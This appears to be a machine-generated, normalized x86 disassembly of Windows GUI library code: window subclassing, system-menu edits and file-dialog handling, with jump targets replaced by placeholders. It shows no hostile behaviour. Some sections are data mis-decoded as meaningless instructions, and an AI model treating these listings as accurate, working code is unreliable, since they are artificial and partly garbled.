mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4c ]
add eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jne r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov edx [ ebp - 0xc ]
cmp eax [ edx ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f794
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_46a3f8
xor edx edx
mov eax ebx
call sub_44bd60
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x5c ]
pop esi
pop ebx
retn
sub_42f7b8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4530b8
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
sub_42f838
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4688d0
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_42f7b8
pop ecx
sub_42f85c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_46a574
mov edx esp
mov eax esi
call sub_44c214
push 0x20
call GetSystemMetrics
mov esi eax
push 0x21
call GetSystemMetrics
neg eax
push eax
neg esi
push esi
lea eax [ esp + 0x8 ]
push eax
call InflateRect
mov eax [ ebx + 0xc ]
cmp eax 0x11
ja r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov al [ eax + lookup_table_42f8b0 ]
jmp [ eax * 4 + jump_table_42f8c2 ]
movsx eax [ ebx + 0xa ]
cmp eax [ esp + 0x4 ]
jge r-xdata
movsx eax [ ebx + 0xa ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov [ ebx + 0xc ] 0x2
jmp r-xdata
movsx eax [ ebx + 0xa ]
cmp eax [ esp + 0xc ]
jle r-xdata
movsx eax [ ebx + 0xa ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov [ ebx + 0xc ] 0xa
jmp r-xdata
mov [ ebx + 0xc ] 0xc
jmp r-xdata
mov [ ebx + 0xc ] 0xb
jmp r-xdata
mov [ ebx + 0xc ] 0xc
jmp r-xdata
mov [ ebx + 0xc ] 0xa
jmp r-xdata
mov [ ebx + 0xc ] 0xf
jmp r-xdata
mov [ ebx + 0xc ] 0xb
mov [ ebx + 0xc ] 0xf
jmp r-xdata
sub_42f958
mov [ eax + 0x308 ] 0x0
mov ecx [ edx + 0x4 ]
add ecx 0xfffffff6
sub ecx 0x2
jb r-xdata
mov [ eax + 0x308 ] 0x1
jmp r-xdata
je r-xdata
call sub_46a59c
retn
mov [ eax + 0x308 ] 0x2
sub ecx 0x3
je r-xdata
jmp r-xdata
sub_42f98c
push ebx
mov ebx eax
mov eax ebx
call sub_4654cc
mov al [ ebx + 0x308 ]
dec al
je r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ ebx + 0x2fc ]
add [ ebx + 0x300 ] eax
pop ebx
retn
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
sub eax [ ebx + 0x2f8 ]
add [ ebx + 0x304 ] eax
jmp r-xdata
pop ebx
retn
sub_42f9c8
push ebx
mov ebx eax
mov eax [ edx + 0x4 ]
and eax 0xfff0
cmp eax 0xf000
jne r-xdata
mov eax ebx
call sub_468c04
mov [ ebx + 0x308 ] 0x0
pop ebx
retn
xor eax eax
mov [ ebx + 0x304 ] eax
xor eax eax
mov [ ebx + 0x300 ] eax
sub_42f9fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fa21
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fa28
retn
sub_42fa34
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fa59
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fa60
retn
sub_42fa6c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fa91
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fa98
retn
sub_42faa4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fac9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fad0
retn
sub_42fadc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fb01
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fb08
retn
sub_42fb7a
call [ eax + 0x33ec8b55 ]
rcl [ ebp + 0x68 ] 0xa1
sti
inc edx
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fba8
retn
sub_42fbbc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fbe1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fbe8
retn
sub_42fbf4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fc19
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fc20
retn
sub_4300d1
add [ eax ] cl
or [ ebx ] eax
sub [ ecx ] cl
inc ebx
add [ eax + 0x9 ] cl
inc ebx
add [ eax ] ch
adc [ ebx ] al
or edx [ edi + ecx * 2 + 0x70 ]
outsb
inc esp
imul esp [ ecx + 0x6c ] 0xc08b676f
hlt
sub_4302f8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46aae4
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_467084
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_467084
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_46a7e8
mov edi eax
mov eax ebx
call sub_46a7cc
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_46a7b4
mov edi eax
mov eax ebx
call sub_46a800
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_4303ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_4302f8
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_430414
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420f48
mov [ esi + 0x30 ] 0x1
push esi
push sub_4304f0
call sub_421fec
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_43045c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420f94
test bl bl
jle r-xdata
call sub_422084
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_430490
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_46d57c
mov cl 0x1
sub_4304b8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4034f8
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4304f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43051a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430588
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_463e94
mov [ ebp - 0x14 ] eax
call sub_463db0
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_43064b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46ce6c
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_43061d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430624
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46cec8
retn
sub_430624
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430652
mov eax [ ebp - 0x14 ]
call sub_463f48
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_463db8
retn
sub_430684
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x110
jne r-xdata
cmp ebx 0x4e
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x3c ] esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push esi
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
push edi
mov eax [ ebp + 0x10 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
cmp [ edi + 0x8 ] 0xfffffda7
jne r-xdata
push 0xfffffff8
push esi
call GetWindowLongA
call sub_4302f8
sub_430708
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_430414
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ esi + 0x58 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x5c ] eax
mov al [ r-xdata ]
mov [ esi + 0xb0 ] al
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ esi + 0x7c ] eax
mov [ esi + 0x64 ] 0x1
mov [ esi + 0x80 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_430781
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x7c ]
call sub_4032a8
mov eax [ esi + 0x58 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43045c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4307bc
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_430e44
mov eax edi
mov si 0xffed
call sub_4034a4
mov ebx eax
mov eax [ edi + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_4307e4
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx ]
cmp eax 0x110
jne r-xdata
cmp eax 0x4e
jne r-xdata
test [ edi + 0x5e ] 0x1
je r-xdata
mov edx ebx
mov eax edi
call sub_43053c
mov esi [ ebx + 0x8 ]
mov eax [ esi + 0x8 ]
add eax 0x260
cmp eax 0x7
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
jmp [ eax * 4 + jump_table_430828 ]
mov edx [ esi + 0xc ]
mov eax edi
call sub_4307bc
test al al
jne r-xdata
mov eax edi
mov si 0xffee
call sub_4034a4
jmp r-xdata
mov eax edi
mov si 0xffec
call sub_4034a4
jmp r-xdata
mov eax edi
mov si 0xffeb
call sub_4034a4
jmp r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
cmp eax [ edi + 0x68 ]
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax 0x1
mov [ ebx + 0xc ] eax
push eax
push 0x0
mov eax [ edi + 0x3c ]
push eax
call SetWindowLongA
jmp r-xdata
mov [ edi + 0x68 ] eax
mov eax edi
mov si 0xffea
call sub_4034a4
jmp r-xdata
mov [ esp ] 0x1
mov ecx esp
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax edi
mov si 0xffe9
call sub_4034a4
xor eax eax
mov al [ esp ]
mov [ ebx + 0xc ] eax
sub_4308e0
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xa2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_430968
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_43099a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
xchg edx eax
call sub_41d09c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4309a1
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_4309a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4212c0
push ebx
push sub_430968
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_4309e8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404038
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov ecx r-xdata
mov edx esi
call sub_404344
mov eax [ ebx ]
call sub_4044f8
mov dl 0x7c
call sub_40c840
test eax eax
je r-xdata
mov [ eax ] 0x0
inc eax
mov dl 0x7c
call sub_40c840
test eax eax
jne r-xdata
sub_430a38
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_430ce9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebp - 0x68 ]
xor ecx ecx
mov edx 0x58
call sub_402cbc
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
mov [ ebp - 0x68 ] 0x4c
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
mov [ ebp - 0x68 ] 0x58
jmp r-xdata
mov [ ebp - 0x48 ] 0x104
mov [ ebp - 0x48 ] 0xffef
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x60 ]
call sub_4309e8
mov eax [ ebp - 0x8 ]
call sub_4044f8
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0x64 ]
mov [ ebp - 0x50 ] eax
mov [ ebx + 0x68 ] eax
test [ ebx + 0x5c ] 0x40
je r-xdata
mov eax [ ebx + 0x6c ]
call sub_4044f8
mov [ ebp - 0x3c ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x48 ]
add edx 0x2
lea eax [ ebp - 0xc ]
call sub_404684
mov eax [ ebp - 0xc ]
call sub_4044f8
mov esi eax
mov [ ebp - 0x4c ] esi
mov edx [ ebp - 0x48 ]
add edx 0x2
mov eax esi
xor ecx ecx
call sub_402cbc
mov eax [ ebx + 0x78 ]
call sub_4044f8
mov edx eax
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x4c ]
call sub_408aa4
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0x5c ] edx
mov eax r-xdata
mov [ ebp - 0x3c ] eax
jmp r-xdata
inc eax
add esi 0x4
cmp al 0x16
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x34 ] edx
mov eax [ ebx + 0x70 ]
call sub_4044f8
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x20
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov esi rw-data
mov edx eax
cmp dl 0x1f
ja r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ ebp - 0x34 ] 0xfff7ffff
xor [ ebp - 0x34 ] 0x80000
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
test [ ebp - 0x32 ] 0x8
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5e ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_4044f8
mov [ ebp - 0x2c ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x78 ]
call sub_408948
lea eax [ ebp - 0x10 ]
mov ecx 0x1
mov edx 0x1
call sub_404598
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x74 ]
call sub_4040d0
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
xor eax eax
mov esi rw-data
mov [ ebp - 0x24 ] sub_4303ac
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0xb0 ] edx
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x24 ] sub_430684
inc eax
add esi 0x4
cmp al 0x1
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x14 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov esi eax
test esi esi
je r-xdata
or [ ebp - 0x34 ] 0x40
mov [ ebp - 0x20 ] eax
mov edx eax
cmp dl 0x7
ja r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430cf0
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_40405c
retn
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_430e44
test [ ebp - 0x33 ] 0x4
je r-xdata
and [ ebx + 0x5c ] 0xffffff7f
or [ ebx + 0x5c ] 0x80
jmp r-xdata
and [ ebx + 0x5c ] 0xfffffffe
or [ ebx + 0x5c ] 0x1
jmp r-xdata
test [ ebp - 0x34 ] 0x1
je r-xdata
mov eax [ ebp - 0x50 ]
mov [ ebx + 0x64 ] eax
sub_430cfc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov dl [ eax - 0x1 ]
mov eax esi
call sub_40c840
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx ebx
sub ecx esi
mov eax edi
mov edx esi
call sub_404128
inc ebx
mov eax edi
mov edx esi
call sub_404230
mov eax esi
call sub_408a58
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_430d44
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_430e29
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_430cfc
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_430cfc
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_408890
cmp [ eax ] 0x5c
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x5c
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430e30
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_430cfc
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4042f8
cmp eax 0x3
jle r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404344
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1 ] 0x3a
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2 ] 0x5c
je r-xdata
sub_430e44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_430eef
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5e ] 0x1
jne r-xdata
push ebp
mov eax [ edx + 0x1c ]
mov edx [ ebp - 0x8 ]
add edx 0x78
call sub_430cfc
pop ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
push ebp
mov eax [ edx + 0x1c ]
call sub_430d44
pop ecx
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax 0x78
call sub_40408c
jmp r-xdata
mov [ ebp - 0x1 ] 0x20
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430ef6
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_430efc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
push 0x0
push esi
xor ecx ecx
xor edx edx
xor eax eax
call sub_417298
test [ ebx + 0x5e ] 0x1
jne r-xdata
push esi
push edi
call GetClientRect
jmp r-xdata
push esi
push 0x45f
push edi
call GetDlgItem
push eax
call GetWindowRect
push 0x2
push esi
mov eax [ ebx + 0x3c ]
push eax
push 0x0
call MapWindowPoints
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_430f50
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x78 ]
call sub_40408c
cmp [ ebx + 0x3c ] 0x0
je r-xdata
mov eax esp
push eax
push 0x105
push 0x465
mov eax [ ebx + 0x3c ]
push eax
call GetParent
push eax
call SendMessageA
mov edx esi
mov eax esp
call sub_408c2c
jmp r-xdata
add esp 0x108
pop esi
pop ebx
retn
sub_430fb8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov eax esi
call sub_4042f8
mov ebx eax
cmp ebx 0x1
jle r-xdata
lea eax [ edi + 0x6c ]
push eax
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_404558
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40c63c
test al al
je r-xdata
mov ecx ebx
dec ecx
mov edx esi
mov eax r-xdata
call sub_40c670
test al al
jne r-xdata
dec ebx
sub_431044
push ebx
push esi
add esp 0xffffffcc
mov ebx edx
mov esi eax
xor eax eax
mov edx esp
lea ecx [ eax + 0x41 ]
mov [ edx ] cl
inc eax
inc edx
cmp eax 0x1a
jne r-xdata
xor eax eax
lea edx [ esp + 0x1a ]
lea ecx [ eax + 0x61 ]
mov [ edx ] cl
inc eax
inc edx
cmp eax 0x1a
jne r-xdata
push ebx
push 0x34
lea eax [ esp + 0x8 ]
push eax
mov eax esi
call sub_425570
push eax
call GetTextExtentPointA
mov eax [ ebx ]
mov ecx 0x34
cdq
idiv ecx
mov [ ebx ] eax
add esp 0x34
pop esi
pop ebx
retn
sub_43109c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
adc [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcom [ ecx ]
inc ebx
add ah bh
add al [ eax ]
add [ edx + ebp + 0x16cc0046 ] ah
inc edx
add [ eax + ebx * 2 + 0x46 ] bh
add [ eax ] dh
pop edx
inc esi
add [ esi + 0x7e9c0040 ] al
inc esi
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x2fffb9a6 ] bl
cmp eax [ ebp ]
or [ eax + 0x46 ] ah
add [ edi + ecx * 4 ] ah
inc ecx
add [ eax + 0x5c ] bl
inc esi
add [ esp + ebx * 2 + 0x5da00046 ] dl
inc esi
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax ] bl
inc si
add [ eax - 0x47ffbded ] dh
mov eax [ 0x56f00046 ]
inc esi
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
clc
